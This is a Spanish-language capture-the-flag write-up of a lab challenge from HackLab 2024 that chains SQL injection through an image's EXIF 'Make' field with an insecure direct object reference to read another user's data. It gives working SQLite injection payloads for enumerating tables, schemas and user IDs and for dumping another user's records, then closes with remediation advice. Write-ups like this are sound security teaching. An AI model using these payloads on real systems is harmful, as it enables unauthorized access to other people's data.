# Mis Viajes — Writeup

- **Plataforma:** SoftwareSeguro (HackLab 2024)
- **ID Desafío:** 27
- **Categoría:** SQLi (SQL Injection) / IDOR
- **Vulnerabilidades:** CWE-89 (SQL Injection en metadatos EXIF), CWE-639 (Insecure Direct Object Reference)

---

## 1. Descripción del Desafío

Un amigo creó un usuario en una plataforma para guardar imágenes de viajes.
Cada imagen puede llevar una descripción y, si cuenta con los metadatos
necesarios, se geolocaliza en un mapa y se muestran marca y modelo de la
cámara. El objetivo es acceder a imágenes de otros usuarios que no
corresponden a la cuenta propia.

---

## 2. Reconocimiento

La interfaz web presenta una sección titulada **"Mis Imágenes"** junto a un mapa interactivo (renderizado con Leaflet).  
De cada imagen se expone más información de la que el formulario de subida
solicita explícitamente (donde solo se pide un archivo y una descripción), lo
cual sugiere un procesamiento y enriquecimiento de datos del lado del servidor.

### Endpoint de Lectura
```http
GET /images/{user_id}
```
Devuelve una lista en formato JSON con las imágenes asociadas al `user_id`:
```json
[
  {
    "datetime": "2024:10:14 23:51:37",
    "description": "Tarde en V. Carlos Paz",
    "filename": "ea255de8-...jpg",
    "id": 2,
    "latitude": -31.39,
    "longitude": -64.47,
    "make": "Samsung",
    "model": "Galaxy S23",
    "user_id": "d6ac9cd7-03d8-4a95-a73f-41a02f09d210"
  }
]
```
El `user_id` enviado en la ruta coincide de forma exacta con la clave `user_id` de cada objeto, confirmando el patrón `/images/:user_id`.

### Endpoint de Subida
```http
POST /upload
Content-Type: application/json

{
  "image": "data:image/png;base64,...",
  "description": "...",
  "user_id": "..."
}
```

De todos los campos que el backend almacena (`datetime`, `description`, `filename`, `latitude`, `longitude`, `make`, `model`, `user_id`), el cliente solo remite `description` y `user_id`.  
Los campos restantes (`datetime`, `latitude`, `longitude`, `make`, `model`) son extraídos directamente por el backend leyendo los **metadatos EXIF** del archivo subido. Al tratarse de procesamiento interno, los metadatos suelen quedar desprotegidos de filtros de sanitización convencionales.

---

## 3. Análisis — Descartando Vectores

Antes de dar con el vector vulnerable, se evaluaron diferentes puntos de entrada:

- **`description`:** El backend convierte comillas simples en entidades HTML (`'` → `&#39;`) previo a guardar, mitigando inyecciones SQL en este campo.
- **`user_id` en la ruta GET:** Posee una validación estricta de formato UUID. Si el valor no cumple con la expresión regular, responde `404` antes de llegar a la base de datos.
- **`user_id` en el cuerpo del POST:** Es persistido parametrizado o validado.

El vector real resultó ser el **metadato EXIF `Make`** (marca de la cámara), extraído en el servidor y concatenado sin sanitizar dentro de una sentencia SQL.

### Confirmando la Inyección
Al enviar una imagen con el campo EXIF `Make` fijado en `test'`, el endpoint `POST /upload` respondió con un código de estado **500 Internal Server Error**, confirmando la existencia de **SQL Injection (CWE-89)** sobre motor **SQLite**.

---

## 4. Explotación

> Las imágenes de prueba se construyeron editando el campo EXIF `Make` con `exiftool` y enviándolas mediante **Burp Suite Repeater** dentro del cuerpo JSON en formato base64. Existen dos técnicas válidas documentadas para este reto:

### Enfoque A — Cierre y Comentario de Línea (`-- -`)
Variante documentada en la solución oficial (equipo M1st1fy, UTN FRBA). Se cierra la comilla e interrumpe el resto de la query:

```sql
',((SELECT sqlite_version()))) -- -
```
Esto confirma el motor **SQLite 3.40.1** y permite enumerar:

1. **Tablas existentes:**
   ```sql
   ',((SELECT GROUP_CONCAT(name,'|') FROM sqlite_master WHERE type='table'))) -- -
   ```
   → Retorna `images`, `sqlite_sequence`.

2. **Esquema de la tabla `images`:**
   ```sql
   ',((SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name='images'))) -- -
   ```
   → Expone las columnas: `id, user_id, filename, description, latitude, longitude, datetime, make, model`.

3. **Enumerar usuarios:**
   ```sql
   ',((SELECT GROUP_CONCAT(user_id,'|') FROM images))) -- -
   ```
   → Revela dos `user_id`: el propio y el de la víctima (`1089b4a3-b6d0-450d-9c8a-b120b30bcb04`).

Con el `user_id` ajeno, basta con reasignar la variable global `USER_ID` desde la consola de desarrollador del navegador y volver a disparar `loadImages()`. La interfaz grafica renderiza el contenido ajeno con la flag en la descripción.

---

### Enfoque B — Concatenación con Operador `||` (Usado en esta resolución)
En lugar de forzar comentarios de línea, se incrusta una subconsulta utilizando el operador de concatenación nativo de SQLite (`||`):

```sql
' || (SELECT group_concat(filename || ':' || user_id) FROM images) || '
```

Al subir la imagen, la respuesta en el campo `make` devuelve la relación completa de `filename:user_id` de todas las imágenes registradas en el sistema.

Habiendo identificado el `user_id` de la víctima (`1089b4a3-b6d0-450d-9c8a-b120b30bcb04`), se extraen todos sus atributos en una sola consulta:

```sql
' || (SELECT description || ' | ' || datetime || ' | lat:' || latitude || ' | lon:' || longitude || ' | ' || make || ' ' || model FROM images WHERE user_id='1089b4a3-b6d0-450d-9c8a-b120b30bcb04') || '
```

Al consultar `GET /images/{user_id_propio}`, el campo `make` devuelve directamente:

```text
878c14bbd5cd0127b86fd8dac1d55c4d | 2024:10:14 23:51:37 | lat:-31.4417965 | lon:-64.1918484 | UTN Hacklab2024
```

---

## 5. Resultado y Flag

- **Flag:** `878c14bbd5cd0127b86fd8dac1d55c4d`

> **Ventaja del Enfoque B:** La técnica de concatenación directa extrae la flag en una única consulta sin necesidad de interactuar con la consola de JavaScript ni alterar variables del frontend.

---

## 6. Causa Raíz y Remediación Defensiva

- **Causa Raíz:** 
  1. **SQL Injection (CWE-89):** Los metadatos EXIF son tratados erróneamente como datos confiables y concatenados directamente dentro de sentencias SQL `INSERT`.
  2. **IDOR (CWE-639):** La ruta `GET /images/:user_id` confía en el parámetro enviado en la URL sin validar si coincide con la sesión del usuario autenticado.

- **Remediación Recomendada (OWASP):**
  1. **Consultas Parametrizadas:** Toda entrada externa, incluyendo metadatos extraídos de archivos multimedia (EXIF, ID3, PDF metadata), debe vincularse mediante marcadores de posición (`?`):
     ```python
     cursor.execute(
         """INSERT INTO images 
            (user_id, filename, description, latitude, longitude, datetime, make, model) 
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)""",
         (user_id, filename, description, lat, lon, dt, make, model)
     )
     ```
  2. **Control de Acceso a Nivel de Objeto:** El endpoint de lectura debe resolver el identificador de usuario a partir del token o cookie de sesión validada, impidiendo consultar imágenes ajenas alterando el path.
  3. **Validación de Metadatos:** Establecer límites de longitud y caracteres permitidos sobre los campos EXIF antes de procesarlos.
  4. **Ocultamiento de Trazas:** Inhabilitar mensajes de depuración detallados en entornos de producción.

---

## 7. Herramientas Utilizadas

- **Burp Suite Community Edition** (Interceptación y manipulación de peticiones HTTP en Repeater).
- **`exiftool`** (Inyección de payloads en metadatos EXIF `Make`).
- **Python 3 / `base64`** (Generación de imágenes de prueba y codificación en base64).

---

## 8. Referencias

- Solución oficial del reto — Equipo M1st1fy (UTN FRBA, HackLab 2024):  
  [https://app.softwareseguro.com.ar/challenge-solution?solution-id=27](https://app.softwareseguro.com.ar/challenge-solution?solution-id=27)
- [OWASP — SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [OWASP — Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
